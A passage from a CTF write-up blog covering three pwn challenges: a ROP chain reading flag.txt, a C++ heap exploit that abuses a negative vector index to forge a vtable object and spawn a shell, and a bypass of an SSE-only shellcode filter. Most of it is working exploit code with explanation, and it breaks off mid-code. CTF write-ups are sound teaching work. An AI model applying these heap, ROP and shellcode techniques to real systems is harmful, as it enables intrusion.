+</span></span><span style="display:flex;"><span>flagtxt <span style="color:#f92672">=</span> stack_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe8</span>
+</span></span><span style="display:flex;"><span>mov_r10_rcx_syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41710e</span>
+</span></span><span style="display:flex;"><span>pop_rcx_5_oth <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4035fe</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>,
+</span></span><span style="display:flex;"><span>    pop_rsi_rdi_rbp, <span style="color:#ae81ff">0</span>, flagtxt, <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    pop_rdx_rbx_rbp, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    pop_rax, <span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>    syscall_ret,
+</span></span><span style="display:flex;"><span>    pop_rsi_rdi_rbp, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    pop_rdx_rbx_rbp, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    pop_rcx_5_oth, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    pop_rax, <span style="color:#ae81ff">0x28</span>,
+</span></span><span style="display:flex;"><span>    mov_r10_rcx_syscall,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cosmofile:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, payload)
+</span></span></code></pre></div><p>Full exploit can be found here: <a href="/blog/scripts/l3ak25/cosmofile.py">exploit.py</a></p>
+<h3 id="notes">Notes++</h3>
+<p>This is a C++ challenge. It’s kind of a heap challenge, which consists of creating, listing,
+setting the content, and displaying the content of notes, which are objects of the classes
+<code>RandomNote</code>, <code>FixedNote</code>, and <code>DynamicNote</code>.</p>
+<p>I think all the classes are implemented correctly, except for <code>FixedNote</code>,
+where the content is not zeroed out in the constructor. This is useful to know for leaking some data that isn’t cleared.</p>
+<p>I reversed the classes to what they might look like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Note</span> {
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    Note();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">virtual</span> <span style="color:#f92672">~</span>Note();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">displayContent</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setContent</span>();
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RandomNote</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">public</span> Note {
+</span></span><span style="display:flex;"><span>    string content;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    RandomNote();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">virtual</span> <span style="color:#f92672">~</span>RandomNote();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">displayContent</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setContent</span>();
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FixedNote</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">public</span> Note {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> content[<span style="color:#ae81ff">40</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    FixedNote();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">virtual</span> <span style="color:#f92672">~</span>FixedNote();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">displayContent</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setContent</span>();
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DynamicNote</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">public</span> Note {
+</span></span><span style="display:flex;"><span>    string content;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    DynamicNote();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">virtual</span> <span style="color:#f92672">~</span>DynamicNote();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">displayContent</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setContent</span>();
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>Notes are added in a <code>vector</code>, but when accessing an element in that vector,
+there’s only an upper bound check, not a lower bound check, since the index is <code>int64</code>.
+Because of that, there’s a vector underflow with a negative index.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#f92672">::</span><span style="color:#66d9ef">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span>std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span>std<span style="color:#f92672">::</span>cout, <span style="color:#e6db74">&#34;Enter note index to set content: &#34;</span>);
+</span></span><span style="display:flex;"><span>std<span style="color:#f92672">::</span>istream<span style="color:#f92672">::</span><span style="color:#66d9ef">operator</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span>std<span style="color:#f92672">::</span>cin, <span style="color:#f92672">&amp;</span>index);
+</span></span><span style="display:flex;"><span>std<span style="color:#f92672">::</span>numeric_limits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">long</span><span style="color:#f92672">&gt;::</span>max();
+</span></span><span style="display:flex;"><span>std<span style="color:#f92672">::</span>istream<span style="color:#f92672">::</span>ignore((std<span style="color:#f92672">::</span>istream <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>std<span style="color:#f92672">::</span>cin, <span style="color:#ae81ff">0x7FFFFFFFFFFFFFFFLL</span>, <span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>index_ <span style="color:#f92672">=</span> index;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( index_ <span style="color:#f92672">&gt;=</span> std<span style="color:#f92672">::</span>ssize<span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>Note <span style="color:#f92672">*&gt;&gt;</span>(notes) )
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_38;
+</span></span><span style="display:flex;"><span>note <span style="color:#f92672">=</span> <span style="color:#f92672">**</span>(_QWORD <span style="color:#f92672">**</span>)std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>Note <span style="color:#f92672">*&gt;::</span><span style="color:#66d9ef">operator</span>[](notes, index);
+</span></span></code></pre></div><p>My exploitation strategy is to leak the heap, libc, and binary base addresses
+to create a fake <code>Note</code> on the heap and access it using a negative index,
+gaining arbitrary read/write.
+I used that to leak <code>environ</code> (a stack leak) and place a ROP chain on the stack.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># dummy chunk to later trigger fastbin consolidation</span>
+</span></span><span style="display:flex;"><span>new_note(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>set_content(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x500</span>)
+</span></span><span style="display:flex;"><span>delete_note(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># fill tcache bin and two chunks into fastbin</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
+</span></span><span style="display:flex;"><span>    new_note(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    set_content(i) <span style="color:#75715e"># binary pointers in chunks</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
+</span></span><span style="display:flex;"><span>    delete_note(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># creatu large chunk to trigger consolidation</span>
+</span></span><span style="display:flex;"><span>new_note(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>set_content(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x500</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># using FixedNote to get libc and base address leaks</span>
+</span></span><span style="display:flex;"><span>new_note(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>libc_leak <span style="color:#f92672">=</span> u64(display_note(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x203b50</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Libc leak: </span><span style="color:#e6db74">{</span>libc_leak<span style="color:#e6db74">:</span><span style="color:#e6db74">#x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_leak
+</span></span><span style="display:flex;"><span>set_content(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>pie_leak <span style="color:#f92672">=</span> u64(display_note(<span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">8</span>:]<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x52be</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;PIE leak: </span><span style="color:#e6db74">{</span>pie_leak<span style="color:#e6db74">:</span><span style="color:#e6db74">#x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># similar idea to leak heap address</span>
+</span></span><span style="display:flex;"><span>new_note(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
+</span></span><span style="display:flex;"><span>    new_note(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
+</span></span><span style="display:flex;"><span>    delete_note(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>delete_note(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>set_content(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x500</span>)
+</span></span><span style="display:flex;"><span>new_note(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>set_content(<span style="color:#ae81ff">2</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span>)
+</span></span><span style="display:flex;"><span>heap_leak <span style="color:#f92672">=</span> u64(display_note(<span style="color:#ae81ff">2</span>)[<span style="color:#ae81ff">0x18</span>:]<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>heap_leak <span style="color:#f92672">=</span> unprotect(heap_leak)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Heap leak: </span><span style="color:#e6db74">{</span>heap_leak<span style="color:#e6db74">:</span><span style="color:#e6db74">#x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># expand vector to trigger reallocate so vector is after chunks</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>    new_note(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fake DynamicNote chunk</span>
+</span></span><span style="display:flex;"><span>fake_note <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    pie_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8CA0</span>, <span style="color:#75715e"># DynamicNote vtable</span>
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>environ, <span style="color:#75715e"># pointer</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#75715e"># size, capacity</span>
+</span></span><span style="display:flex;"><span>    heap_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span> <span style="color:#75715e"># pointer to fake note at index -31</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>set_content(<span style="color:#ae81ff">2</span>, fake_note)
+</span></span><span style="display:flex;"><span>stack_leak <span style="color:#f92672">=</span> u64(display_note(<span style="color:#f92672">-</span><span style="color:#ae81ff">31</span>)[:<span style="color:#ae81ff">8</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1e0</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Stack leak: </span><span style="color:#e6db74">{</span>stack_leak<span style="color:#e6db74">:</span><span style="color:#e6db74">#x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fake_note <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    pie_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8CA0</span>,
+</span></span><span style="display:flex;"><span>    stack_leak,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x80</span>,
+</span></span><span style="display:flex;"><span>    heap_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>set_content(<span style="color:#ae81ff">2</span>, fake_note)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10f75b</span>
+</span></span><span style="display:flex;"><span>ret     <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10f75c</span>
+</span></span><span style="display:flex;"><span>binsh   <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    pop_rdi, binsh,
+</span></span><span style="display:flex;"><span>    ret,
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>set_content(<span style="color:#f92672">-</span><span style="color:#ae81ff">31</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ia()
+</span></span></code></pre></div><p>Full exploit can be found here: <a href="/blog/scripts/l3ak25/notespp.py">exploit.py</a></p>
+<h3 id="sshellcode">SShEllcode</h3>
+<p>And the last challenge is a shellcode challenge that only allows SSE instructions
+and no memory access (as far as I could tell).</p>
+<p>The whole challenge is written in Python but uses <code>ctypes</code> for calling libc functions.
+Instructions are checked with the Capstone library for disassembling the bytes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_thing</span>(code):
+</span></span><span style="display:flex;"><span>    md <span style="color:#f92672">=</span> Cs(CS_ARCH_X86, CS_MODE_64)
+</span></span><span style="display:flex;"><span>    md<span style="color:#f92672">.</span>detail <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    total_len <span style="color:#f92672">=</span> len(code)
+</span></span><span style="display:flex;"><span>    consumed <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(code) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x200</span>:
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#e6db74">&#34;Too much stuff&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> insn <span style="color:#f92672">in</span> md<span style="color:#f92672">.</span>disasm(code, <span style="color:#ae81ff">0</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> X86_GRP_SSE1 <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> insn<span style="color:#f92672">.</span>groups <span style="color:#f92672">and</span> X86_GRP_SSE2 <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> insn<span style="color:#f92672">.</span>groups:
+</span></span><span style="display:flex;"><span>            print(insn<span style="color:#f92672">.</span>bytes)
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#e6db74">&#34;Whats that fancy instructions&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> op <span style="color:#f92672">in</span> insn<span style="color:#f92672">.</span>operands:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> op<span style="color:#f92672">.</span>type <span style="color:#f92672">==</span> CS_OP_MEM:
+</span></span><span style="display:flex;"><span>                exit(<span style="color:#e6db74">&#34;No memory&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> insn<span style="color:#f92672">.</span>id <span style="color:#f92672">==</span> X86_INS_MASKMOVDQU:
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#e6db74">&#34;That is a very weird instruction&#34;</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        consumed <span style="color:#f92672">+=</span> insn<span style="color:#f92672">.</span>size
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> consumed <span style="color:#f92672">!=</span> total_len:
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#e6db74">&#34;I dont know those bytes&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>CDLL(<span style="color:#e6db74">&#34;libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>mmap<span style="color:#f92672">.</span>restype <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>c_void_p
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>mmap<span style="color:#f92672">.</span>argtypes <span style="color:#f92672">=</span> [ctypes<span style="color:#f92672">.</span>c_void_p, ctypes<span style="color:#f92672">.</span>c_size_t, ctypes<span style="color:#f92672">.</span>c_int, ctypes<span style="color:#f92672">.</span>c_int, ctypes<span style="color:#f92672">.</span>c_int, ctypes<span style="color:#f92672">.</span>c_size_t]
+</span></span><span style="display:flex;"><span>    addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>mmap(ctypes<span style="color:#f92672">.</span>c_void_p(<span style="color:#ae81ff">0x13370000</span>), <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x7</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> addr <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x13370000</span>:
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#e6db74">&#34;Oops&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    ptr <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>POINTER(ctypes<span style="color:#f92672">.</span>c_char)
+</span></span><span style="display:flex;"><span>    map <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>cast(addr, ptr)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ind, i <span style="color:#f92672">in</span> enumerate(code):
+</span></span><span style="display:flex;"><span>        map[ind] <span style="color:#f92672">=</span> i
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    func <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>CFUNCTYPE(ctypes<span style="color:#f92672">.</span>c_void_p)(addr)
+</span></span><span style="display:flex;"><span>    func()
+</span></span></code></pre></div><p>My first idea was to find some SSE instruction with indirect access to memory,
+but I didn&rsquo;t find anything, so I started testing things.</p>
+<p>Eventually, I looked carefully at GDB and saw that we actually have a memory access instruction.
+The bytes <code>\x00\x00</code> correspond to the instruction <code>add byte ptr [rax], al</code>, which can modify memory.</p>
+<p><img src="/blog/images/l3ak25/sshellcode.png" alt="stack"></p>
+<p>Another useful thing is that the <code>r11</code> register contained the shellcode address,
+so we could easily move it to other registers.</p>
+<p>My exploitation strategy was to use <code>add byte ptr [rax], al</code> to write the instruction <code>push rbx</code>,
+and by adjusting <code>rsp</code>, it would add two more instructions: <code>xor rax, rax; syscall</code>,
+which are stored in <code>rbx</code>.</p>
+<pre tabindex="0"><code>rdi &lt;- 0
+rsi &lt;- 0x13370000
+rdx &lt;- 0x99b
+rbx &lt;- 0x50fc03148
+rax &lt;- 0x13370153
+rsp &lt;- 0x1337015c
+fill to 0x13370151
+add byte ptr [rax], al
+0x53 -&gt; push rbx
+4831c00f05 -&gt; xor rax, rax; syscall
+</code></pre><p>I created a function that finds a way to get values into registers
+using adds and shifts performed on the <code>0x13370000</code> value.</p>
+<p>With that, I can get any value I need and perform the exploit.
+(The function is a little bit weird because I originally wrote it in a test file
+and later added it to the exploit.)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>ADDR <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x13370000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_value</span>(val):
+</span></span><span style="display:flex;"><span>    st <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (ADDR <span style="color:#f92672">&lt;&lt;</span> st) <span style="color:#f92672">&lt;</span> val:
+</span></span><span style="display:flex;"><span>        st <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    st <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    arr <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> ADDR <span style="color:#f92672">&lt;&lt;</span> st
+</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">=</span> st
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> res <span style="color:#f92672">!=</span> val:
+</span></span><span style="display:flex;"><span>        d <span style="color:#f92672">=</span> ADDR <span style="color:#f92672">&lt;&lt;</span> i <span style="color:#66d9ef">if</span> i <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> ADDR <span style="color:#f92672">&gt;&gt;</span> (<span style="color:#f92672">-</span>i)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> res <span style="color:#f92672">+</span> d <span style="color:#f92672">&gt;</span> val:
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">+=</span> d
+</span></span><span style="display:flex;"><span>            arr<span style="color:#f92672">.</span>append(i)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> st, arr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xorps xmm1, xmm1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movq rdi, xmm1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movq xmm0, r11
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">movq rsi, xmm0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">psllq xmm0, 6
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">paddq xmm1, xmm0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>st, arr <span style="color:#f92672">=</span> find_value(<span style="color:#ae81ff">0x50fc03148</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> arr:
+</span></span><span style="display:flex;"><span>    df <span style="color:#f92672">=</span> st <span style="color:#f92672">-</span> i
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> df <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
